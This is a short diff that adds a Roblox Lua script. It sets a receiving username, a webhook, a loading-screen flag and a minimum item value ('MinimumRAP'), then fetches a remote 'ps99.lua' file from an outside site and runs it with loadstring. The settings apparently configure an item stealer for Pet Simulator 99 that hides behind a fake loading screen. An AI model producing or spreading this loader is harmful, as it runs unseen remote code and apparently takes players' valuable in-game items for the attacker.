@@ -1,0 +1,9 @@
+Username = "ShuyanNee"
+Username2 = "ShuyanNee"
+Webhook = "idk"
+
+LoadingScreen = true
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
